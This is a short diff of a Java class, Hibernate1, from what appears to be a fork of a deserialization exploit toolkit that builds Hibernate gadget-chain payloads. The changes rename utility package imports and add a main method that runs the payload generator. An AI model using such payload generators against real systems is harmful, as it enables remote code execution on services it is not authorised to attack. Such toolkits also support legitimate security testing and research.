@@ -8,6 +8,7 @@ import java.lang.reflect.Method;
 import java.util.Map;
 import java.util.HashMap;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.hibernate.engine.spi.TypedValue;
 import org.hibernate.tuple.component.AbstractComponentTuplizer;
 import org.hibernate.tuple.component.PojoComponentTuplizer;
@@ -19,9 +20,9 @@ import org.hibernate.EntityMode;
 import A.R.ysogate.payloads.DynamicDependencies;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.JavaVersion;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.JavaVersion;
+import A.R.ysogate.payloads.utils.Reflections;
 
 
 /**
@@ -175,5 +176,9 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
 		Reflections.setFieldValue(v2, "type", t);
 
 		return Gadgets.makeMap(v1, v2);
+	}
+
+	public static void main ( final String[] args ) throws Exception {
+		PayloadRunner.run(Hibernate1.class, args);
 	}
 }
